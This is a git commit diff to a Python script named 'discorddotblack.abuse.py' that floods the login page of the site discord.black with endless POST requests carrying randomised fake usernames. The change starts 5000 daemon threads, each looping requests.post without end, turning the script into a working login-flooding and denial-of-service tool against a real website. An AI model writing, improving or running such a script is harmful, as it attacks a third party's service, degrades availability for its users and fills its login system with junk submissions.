6dcf929b1d986c7829e54dd3d000c135ed302dff
PiggyAwesome <48888771+PiggyAwesome@users.noreply.github.com>
2021-08-14 16:45:31 +0200

    Update discorddotblack.abuse.py

--- discorddotblack.abuse.py
+++ discorddotblack.abuse.py
@@ -1,6 +1,7 @@
 import requests
 import threading
-
+from threading import Thread
+import random
 headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36'}
 
 url = 'https://discord.black/index.php?/login/='
@@ -10,7 +11,7 @@ data = {
 
 ' csrfKey': '18548ea8f1b8eeadd0caae496dabf7c1',
 'ref': 'aHR0cHM6Ly9kaXNjb3JkLmJsYWNrLw==',
-'auth': 'skwll@is.epic',
+'auth': random.choice("1234567890poiuytrewq") + random.choice("1234567890poiuytrewq") + random.choice("1234567890poiuytrewq") + random.choice("1234567890poiuytrewq") + random.choice("1234567890poiuytrewq") + random.choice("1234567890poiuytrewq") + random.choice("1234567890poiuytrewq") + random.choice("1234567890poiuytrewq") + random.choice("1234567890poiuytrewq") + random.choice("1234567890poiuytrewq") + ' @is.epic',
 'password': 'gfyguhvgyfguh',
 '_processLogin': 'usernamepassword',
 
@@ -22,20 +23,8 @@ def do_request():
     while True:
       feedback = requests.post(url, data=data, headers=headers)
       print(feedback)
-do_request()
 
 
-threads = []
-
-for i in range(5):
-
- t = threading.Thread(target=do_request())
- t.daemon = True
- threads.append(t)
-
-
-for i in range(5):
- threads[i].start
-
-for i in range(5):
- threads[i].join
+if __name__ == '__main__':
+    for i in range(5000):
+     Thread(target = do_request, daemon = True).start()
